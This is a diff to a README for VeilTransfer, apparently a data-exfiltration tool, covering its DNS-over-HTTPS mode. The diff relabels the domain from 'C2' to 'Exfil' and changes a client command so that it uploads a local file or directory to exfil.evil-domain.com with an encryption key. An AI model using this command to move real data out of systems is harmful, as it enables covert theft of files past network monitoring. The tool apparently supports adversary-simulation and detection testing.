@@ -114,7 +114,7 @@ To establish a secure data exfiltration mechanism utilizing DNS over HTTPS (DoH)
 
    exfil -> test.evil-domain.com
 
-The domain exfil.evil-domain.com will serve as the DNS C2 domain.
+The domain exfil.evil-domain.com will serve as the DNS Exfil domain.
 
 Then, start the VeilTransfer Server in DoH mode with the following command:
 ```bash
@@ -124,7 +124,7 @@ Note: The encryption key (-key) must be 16 or 32 characters long.
 
 To upload files via DoH, ensure that the VeilTransfer Server is actively running in DoH mode with a valid encryption key. Then, initiate the transfer using the client command:
 ```bash
-veiltransfer_client transfer doh -localPath /path/to/file_or_directory -key ag36rjsg284nfk2g -dnsServer dns.example.com
+veiltransfer_client transfer doh -localPath /path/to/file_or_directory -key ag36rjsg284nfk2g -dnsServer exfil.evil-domain.com
 ```
 
 #### Transfer Files via QUIC
